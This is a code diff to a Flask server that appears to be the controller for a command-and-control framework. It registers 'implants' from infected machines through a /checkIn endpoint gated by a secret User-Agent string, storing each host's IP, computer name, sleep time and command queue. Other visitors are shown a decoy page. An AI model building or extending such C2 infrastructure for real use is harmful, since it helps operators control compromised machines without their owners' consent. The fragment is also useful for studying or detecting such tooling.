@@ -31,7 +31,7 @@ def addImplant(data):
     connection = sqlite3.connect("./data/real.db")
     cursor = connection.cursor()
     results = [x for x in cursor.execute(
-        "SELECT id FROM Implants WHERE agentId=?", [(data["agentId"])])]
+        "SELECT id FROM Implants WHERE IP=?", [data["IP"]])]
     if len(results) == 0:
         parsedData = ["PleaseGiveA", makeId(), str(
             datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["cmdQ"]]
@@ -41,7 +41,8 @@ def addImplant(data):
         connection.commit()
 
     elif (len(results) == 1):
-        return ("I lowkey don't know what we change everytime we checkIn after the first time, so this text is a placeholder")
+        print("Already in database")
+        return ("implant already in database")
 
         # parsedData = [data["authorize_code"], makeId(), str(
         #     datetime.today()), data["IP"], data["sleepTime"], data["guido"], data["computerName"], data["DHkey"]]
@@ -77,7 +78,6 @@ def index():
 
 @ app.route("/checkIn", methods=['POST'])
 def check():
-    print(request.headers["User-Agent"])
     if (request.headers["User-Agent"]) == "IWasBornInTheUSA":
         # raw data function d = request.get_data()
         #print("test")
@@ -94,9 +94,7 @@ def check():
         #print("after", data)
         data["IP"] = request.remote_addr
         data["cmdQ"] = "No Cmds"
-        print(data)
-        addImplant(data)
-        return data
+        return addImplant(data)
     else:
         return render_template("wrongTurn.html")
         # return redirect("https://www.youtube.com/watch?v=Pv0CA1rjGfg")
